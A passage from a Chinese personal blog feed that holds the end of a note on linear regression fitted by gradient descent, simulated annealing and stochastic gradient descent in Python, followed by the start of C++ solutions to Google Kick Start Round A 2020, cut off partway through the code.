\\      \vdots \\      x_d \\    \end{matrix}\right)+ b</script><p>可以把 $x_i^2$ 看成另一个特征，本质还是线性回归</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 梯度下降</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient_descent</span><span class="params">(x, y)</span>:</span></span><br><span class="line">  lr = <span class="number">1e-12</span>  <span class="comment"># learning rate</span></span><br><span class="line">  iteration = <span class="number">1000000</span>  <span class="comment"># 迭代次数</span></span><br><span class="line">  w = np.ones((<span class="number">1</span>, len(x[<span class="number">0</span>]) + <span class="number">1</span>)).T</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(iteration):</span><br><span class="line">    w = w - lr * gradient(w, x, y)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> w</span><br><span class="line"></span><br><span class="line">x = [ [<span class="number">338.</span>], [<span class="number">333.</span>], [<span class="number">328.</span>], [<span class="number">207.</span>], [<span class="number">226.</span>], [<span class="number">25.</span>], [<span class="number">179.</span>], [<span class="number">60.</span>], [<span class="number">208.</span>], [<span class="number">606.</span>]]</span><br><span class="line">y = [ <span class="number">640.</span>, <span class="number">633.</span>, <span class="number">619.</span>, <span class="number">393.</span>, <span class="number">428.</span>, <span class="number">27.</span>, <span class="number">193.</span>, <span class="number">66.</span>, <span class="number">226.</span>, <span class="number">1591.</span>]</span><br><span class="line"></span><br><span class="line">m = len(x)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(m - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">  x[i].insert(<span class="number">0</span>, x[i][<span class="number">0</span>] ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">print(x)</span><br><span class="line">print(y)</span><br><span class="line"></span><br><span class="line">w = gradient_descent(x, y)</span><br><span class="line">w = w.tolist()</span><br><span class="line"></span><br><span class="line">print(w)</span><br><span class="line"></span><br><span class="line">w0 = w[<span class="number">0</span>:len(w) - <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(math.sqrt(loss_function(w0, w[-1][0], x, y)) / len(x))</span></span><br><span class="line">print(math.sqrt(loss_function(w, x, y)) / len(x))  <span class="comment"># 均方误差</span></span><br></pre></td></tr></table></figure><pre><code>[[114244.0, 338.0], [110889.0, 333.0], [107584.0, 328.0], [42849.0, 207.0], [51076.0, 226.0], [625.0, 25.0], [32041.0, 179.0], [3600.0, 60.0], [43264.0, 208.0], [367236.0, 606.0]][640.0, 633.0, 619.0, 393.0, 428.0, 27.0, 193.0, 66.0, 226.0, 1591.0][[0.002695722750670167], [0.9906491919888195], [0.9999201489658276]]15.529527888679146</code></pre><p>可以看到误差小了一半。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画图</span></span><br><span class="line"></span><br><span class="line">x_list = []</span><br><span class="line">y_list = y</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">  x_list.append(i[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建图</span></span><br><span class="line">ax = plt.gca()</span><br><span class="line"><span class="comment">#设置x轴、y轴名称</span></span><br><span class="line">ax.set_xlabel(<span class="string">'x'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#画散点图，以x_list中的值为横坐标，以y_list中的值为纵坐标</span></span><br><span class="line"><span class="comment">#参数c指定点的颜色，s指定点的大小,alpha指定点的透明度</span></span><br><span class="line">ax.scatter(x_list, y_list, c=<span class="string">'r'</span>, s=<span class="number">20</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p1 = [0, 600]</span></span><br><span class="line"><span class="comment"># p2 = [0 * w[0][0] + w[1][0], 600 * w[0][0] + w[1][0]]</span></span><br><span class="line">p1 = []</span><br><span class="line">p2 = []</span><br><span class="line"></span><br><span class="line">print(w[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">print(w[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">print(w[<span class="number">2</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">600</span>):</span><br><span class="line">  p1.append(i)</span><br><span class="line">  p2.append(i * i * w[<span class="number">0</span>][<span class="number">0</span>] + i * w[<span class="number">1</span>][<span class="number">0</span>] + w[<span class="number">2</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(p1)</span></span><br><span class="line"><span class="comment"># print(p2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ax1 = plt.gca()</span><br><span class="line"><span class="comment">#设置x轴、y轴名称</span></span><br><span class="line">ax1.set_xlabel(<span class="string">'x'</span>)</span><br><span class="line">ax1.set_ylabel(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数c指定连线的颜色，linewidth指定连线宽度，alpha指定连线的透明度</span></span><br><span class="line">ax1.plot(p1, p2, color=<span class="string">'b'</span>, linewidth=<span class="number">1</span>, alpha=<span class="number">0.6</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>模型的解为：</p><pre><code>0.0026957227506701670.99064919198881950.9999201489658276</code></pre><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20200621195602.png" alt="20200621195602"></p><h3 id="模拟退火"><a href="#模拟退火" class="headerlink" title="模拟退火"></a>模拟退火</h3><p>模拟退火算法基于物理退火的原理，将固体加热至高温然后冷却，温度越高降温的概率越大 (降温更快)，温度越低降温的概率越小 (降温越慢)。模拟退火算法进行多次降温，直到找到一个可行解。</p><p>简单来说，如果新的状态比当前状态更优就接受该状态，否则以一定概率接受新状态。概率为：$P(\Delta E) = e^{\frac{-\Delta E}{T}}$，其中 $T$ 为当前温度，$\Delta E$ 新状态与当前状态的能量差。</p><p>模拟退火主要有三个参数：初始温度 $T_0$，降温系数 $d$，终止温度 $T_k$。</p><p>让当前温度 $T = T_0$，温度下降，尝试转移，如果转移 $T = d * T$。当 $T &lt; T_k$ 时结束模拟退火算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 模拟退火</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">simulateAnneal</span><span class="params">(x, y)</span>:</span></span><br><span class="line">  Tk = <span class="number">1e-8</span>  <span class="comment"># 终止温度</span></span><br><span class="line">  T0 = <span class="number">100</span>  <span class="comment"># 初始温度</span></span><br><span class="line">  d = <span class="number">0.5</span>  <span class="comment"># 降温系数</span></span><br><span class="line">  w = [[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x[<span class="number">0</span>]) + <span class="number">1</span>)]</span><br><span class="line">  <span class="comment"># now = loss_function(w, x, y)</span></span><br><span class="line">  <span class="comment"># nxt = now</span></span><br><span class="line">  <span class="comment"># min_value = now  # 损失函数最小值</span></span><br><span class="line">  </span><br><span class="line">  min_value = loss_function(w, x, y)  <span class="comment"># 损失函数最小值</span></span><br><span class="line">  T = T0  <span class="comment"># 当前温度</span></span><br><span class="line">  cnt = <span class="number">0</span>  <span class="comment"># 迭代次数</span></span><br><span class="line">  <span class="keyword">while</span> T &gt; Tk:</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    next = []</span><br><span class="line">    mn = <span class="number">1e20</span>  <span class="comment"># 临时的最小值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">      nw = []</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> w:</span><br><span class="line">        nw.append(i.copy())</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> range(len(w)):</span><br><span class="line">        nw[i][<span class="number">0</span>] = w[i][<span class="number">0</span>] + math.cos(myrand() * <span class="number">2</span> * math.pi) * T</span><br><span class="line">      </span><br><span class="line">      nE = loss_function(nw, x, y)  <span class="comment"># 新状态</span></span><br><span class="line">       </span><br><span class="line">      <span class="keyword">if</span> mn &gt; nE:  <span class="comment"># 更新最小值</span></span><br><span class="line">        mn = nE</span><br><span class="line">        next = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nw:</span><br><span class="line">          next.append(i.copy())</span><br><span class="line">    dE = mn - min_value  <span class="comment"># 能量差</span></span><br><span class="line">    <span class="keyword">if</span> dE / T &gt; <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> dE &lt; <span class="number">0</span> <span class="keyword">or</span> math.exp(dE / T) &lt; myrand():</span><br><span class="line">      min_value = mn</span><br><span class="line">      w = []</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> next:</span><br><span class="line">        w.append(i.copy())</span><br><span class="line">    T = T * d  <span class="comment"># 降温</span></span><br><span class="line">  print(cnt)</span><br><span class="line">  <span class="keyword">return</span> w</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myrand</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">return</span> random.randint(<span class="number">0</span>, <span class="number">10000</span>) / <span class="number">10000</span>;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试</span></span><br><span class="line">x = [ [<span class="number">338.</span>], [<span class="number">333.</span>], [<span class="number">328.</span>], [<span class="number">207.</span>], [<span class="number">226.</span>], [<span class="number">25.</span>], [<span class="number">179.</span>], [<span class="number">60.</span>], [<span class="number">208.</span>], [<span class="number">606.</span>]]</span><br><span class="line">y = [ <span class="number">640.</span>, <span class="number">633.</span>, <span class="number">619.</span>, <span class="number">393.</span>, <span class="number">428.</span>, <span class="number">27.</span>, <span class="number">193.</span>, <span class="number">66.</span>, <span class="number">226.</span>, <span class="number">1591.</span>]</span><br><span class="line"></span><br><span class="line">w = simulateAnneal(x, y)</span><br><span class="line"><span class="comment"># w = w.tolist()</span></span><br><span class="line"></span><br><span class="line">print(w)</span><br><span class="line"></span><br><span class="line">print(math.sqrt(loss_function(w, x, y)) / len(x))</span><br></pre></td></tr></table></figure><pre><code>40[[2.5460349824125927], [-145.48637019150746]]32.72257883908066</code></pre><p>模拟退火求得的解随机性比较强，可能效果很好也可能很差，因为模拟退火能跳出局部最优解，也可能跳出全局最优解。</p><h3 id="随机梯度下降"><a href="#随机梯度下降" class="headerlink" title="随机梯度下降"></a>随机梯度下降</h3><p>随机梯度下降法在计算梯度时加入随机因素，这样即便陷入局部最小点，计算出的梯度仍可能不为零，就有机会跳出局部极小继续搜索。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 梯度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient</span><span class="params">(w, x, y)</span>:</span></span><br><span class="line">  x = np.array(x)</span><br><span class="line">  y = np.array(y).reshape(len(y), <span class="number">1</span>)</span><br><span class="line">  x = np.concatenate((x, np.ones((len(x), <span class="number">1</span>))), axis=<span class="number">1</span>)</span><br><span class="line">  w = np.array(w)</span><br><span class="line"></span><br><span class="line">  x = np.matrix(x)</span><br><span class="line">  y = np.matrix(y)</span><br><span class="line">  w = np.matrix(w)</span><br><span class="line">  <span class="comment"># print(w)</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * x.T * (x * w - y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机梯度下降</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_gradient_descent</span><span class="params">(x, y)</span>:</span></span><br><span class="line">  lr = <span class="number">0.0000001</span>  <span class="comment"># learning rate</span></span><br><span class="line">  iteration = <span class="number">1000000</span></span><br><span class="line">  w = np.ones((<span class="number">1</span>, len(x[<span class="number">0</span>]) + <span class="number">1</span>)).T</span><br><span class="line">  w[len(x[<span class="number">0</span>])][<span class="number">0</span>] = y[<span class="number">0</span>] - x[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(iteration):</span><br><span class="line">    id = random.randint(<span class="number">0</span>, len(x) - <span class="number">1</span>)  <span class="comment"># 随机选择一组数据</span></span><br><span class="line">    w = w - lr * gradient(w, [x[id]], [y[id]])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> w</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试</span></span><br><span class="line">x = [ [<span class="number">338.</span>], [<span class="number">333.</span>], [<span class="number">328.</span>], [<span class="number">207.</span>], [<span class="number">226.</span>], [<span class="number">25.</span>], [<span class="number">179.</span>], [<span class="number">60.</span>], [<span class="number">208.</span>], [<span class="number">606.</span>]]</span><br><span class="line">y = [ <span class="number">640.</span>, <span class="number">633.</span>, <span class="number">619.</span>, <span class="number">393.</span>, <span class="number">428.</span>, <span class="number">27.</span>, <span class="number">193.</span>, <span class="number">66.</span>, <span class="number">226.</span>, <span class="number">1591.</span>]</span><br><span class="line"></span><br><span class="line">w = random_gradient_descent(x, y)</span><br><span class="line">w = w.tolist()</span><br><span class="line"></span><br><span class="line">print(w)</span><br><span class="line"></span><br><span class="line">w0 = w[<span class="number">0</span>:len(w) - <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(math.sqrt(loss_function(w0, w[-1][0], x, y)) / len(x))</span></span><br><span class="line">print(math.sqrt(loss_function(w, x, y)) / len(x))</span><br></pre></td></tr></table></figure><pre><code>[[1.4345358411567755], [275.41894946969995]]84.25783548408097</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://book.douban.com/subject/26708119/" target="_blank" rel="noopener">《机器学习》周志华</a></li><li><a href="http://speech.ee.ntu.edu.tw/~tlkagk/courses_ML17_2.html" target="_blank" rel="noopener">台湾大学 李宏毅 机器学习 Machine Learning (2017,Fall)</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;线性回归&quot;&gt;&lt;a href=&quot;#线性回归&quot; class=&quot;headerlink&quot; title=&quot;线性回归&quot;&gt;&lt;/a&gt;线性回归&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;线性模型&lt;/strong&gt;：&lt;/p&gt;
&lt;script type=&quot;math/tex; mode=display&quot;&gt;y = \boldsymbol{w}^T \boldsymbol{x} + b \tag{1}&lt;/script&gt;&lt;p&gt;数据集：$D = \{(\boldsymbol{x}_1, y_1), (\boldsymbol{x}_2, y_2), … , (\boldsymbol{x}_m, y_m)\}$，$\boldsymbol{x}_i = (x_{i1}; x_{i2};…; x_{id})$&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;损失函数&lt;/strong&gt; (Loss function) 采用平方损失：&lt;/p&gt;
&lt;script type=&quot;math/tex; mode=display&quot;&gt;
L(\boldsymbol{w}, b) = \sum_{i=1}^m (y_i - \hat{y_i})^2&lt;/script&gt;&lt;script type=&quot;math/tex; mode=display&quot;&gt;
= \sum_{i=1}^m (y_i - (\boldsymbol{w}^T \boldsymbol{x}_i + b))^2
\tag{2}&lt;/script&gt;&lt;p&gt;目标是找到一组解 $(\boldsymbol{w}^{\star}, b^{\star})$ 使得损失函数的值最小，即：&lt;/p&gt;
&lt;script type=&quot;math/tex; mode=display&quot;&gt;
(\boldsymbol{w}^*, b^*) = \mathop{arg\ min}\limits_{(\boldsymbol{w}, b)}L(\boldsymbol{w}, b)&lt;/script&gt;&lt;script type=&quot;math/tex; mode=display&quot;&gt;
= \mathop{arg\ min}\limits_{(\boldsymbol{w}, b)} \sum_{i=1}^m (y_i - (\boldsymbol{w}^T \boldsymbol{x}_i + b))^2
\tag{3}&lt;/script&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://wutao18.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="数学" scheme="http://wutao18.github.io/tags/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="机器学习" scheme="http://wutao18.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="西瓜书" scheme="http://wutao18.github.io/tags/%E8%A5%BF%E7%93%9C%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>Google Kick Start Round A 2020</title>
    <link href="http://wutao18.github.io/2020/03/24/Google-Kick-Start-Round-A-2020/"/>
    <id>http://wutao18.github.io/2020/03/24/Google-Kick-Start-Round-A-2020/</id>
    <published>2020-03-24T13:20:35.000Z</published>
    <updated>2020-10-27T03:28:42.545Z</updated>
    
    <content type="html"><![CDATA[<p>比赛链接：<a href="https://codingcompetitions.withgoogle.com/kickstart/round/000000000019ffc7" target="_blank" rel="noopener">kick start Round A 2020</a></p><a id="more"></a><h2 id="A-Allocation"><a href="#A-Allocation" class="headerlink" title="A. Allocation"></a>A. Allocation</h2><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/000000000019ffc7/00000000001d3f56" target="_blank" rel="noopener">题目链接</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>给出 $N$ 栋房子的价格，第 $i$ 栋房子的价格为 $A_i$，你有 $B$ 美元，问最多可以买多少栋房子？</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>典型的贪心问题，将所有的房子按价格从低到高排序后选取即可。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">ll a[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">int</span> kase = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(T--) &#123;</span><br><span class="line">        <span class="keyword">int</span> n, b;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; b;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        ll ans = <span class="number">0</span>;</span><br><span class="line">        sort(a + <span class="number">1</span>, a + <span class="number">1</span> + n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(b &lt; a[i]) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ++ans;</span><br><span class="line">                b -= a[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; ++kase &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Plates"><a href="#B-Plates" class="headerlink" title="B. Plates"></a>B. Plates</h2><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/000000000019ffc7/00000000001d40bb" target="_blank" rel="noopener">题目链接</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><p>有 $N$ 叠盘子，每叠有 $K$ 个盘子，每个盘子有个 <em>beauty value</em>，现在要拿 $P$ 个盘子，使得 <em>beauty value</em> 之和最大。拿盘子的条件：如果一个盘子的上面的盘子都被拿走了，才能拿到这个盘子。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>看完题目就想到是动态规划的题了，但是还是忍不住先暴搜试试能不能水过小数据，结果 WA 了，于是只好老老实实写 DP。</p><p>本题有一点点像多重背包。首先计算每叠盘子各自的前缀和 $sum[N][K]$，设 $dp[i][j]$ 表示前 $i$ 堆盘子中取 $j$ 个盘子的 <em>beauty value</em> 的最大值，转移方程为：</p><script type="math/tex; mode=display">dp[i][j]=max\{dp[i][j], dp[i - 1][j - l] + sum[i][l]|for\ l\ \in[0, min(j, k)]\}</script><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1510</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k, p;</span><br><span class="line">ll a[maxn][maxn];</span><br><span class="line">ll sum[maxn][maxn];</span><br><span class="line">ll dp[maxn][maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">int</span> kase = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(T--) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; maxn; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; maxn; ++j) &#123;</span><br><span class="line">                sum[i][j] = <span class="number">0</span>;</span><br><span class="line">                a[i][j] = <span class="number">0</span>;</span><br><span class="line">                dp[i][j] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k &gt;&gt; p;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= k; ++j) &#123;</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; a[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; ++kase &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= k; ++j) 